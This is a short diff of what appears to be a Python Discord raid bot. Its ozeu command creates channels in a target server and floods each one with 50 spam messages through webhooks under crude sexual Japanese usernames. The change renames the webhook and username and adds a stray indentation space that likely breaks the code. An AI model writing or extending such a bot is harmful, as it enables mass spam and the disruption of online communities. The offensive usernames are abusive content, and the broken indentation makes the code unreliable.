@@ -87,16 +87,17 @@ async def ozeu(ctx, guild_id: int):
     created_channels = [ch for ch in created_channels if ch is not None]
 
     # --- Webhook送信 ---
-    async def send_with_webhook(channel):
+     async def send_with_webhook(channel):
         try:
-            webhook = await channel.create_webhook(name="ZPlusWebhook")
+            webhook = await channel.create_webhook(name="ozeuWebhook")
             for _ in range(50):
-                await webhook.send(SPAM_MESSAGE, username="ヤリマン3号")
+                await webhook.send(SPAM_MESSAGE, username="イクイク")
         except Exception as e:
             print(f"{channel.name} のWebhook送信でエラー: {e}")
 
     webhook_tasks = [send_with_webhook(ch) for ch in created_channels]
     await asyncio.gather(*webhook_tasks)
+
 
     # --- ロール作成 ---
     try:
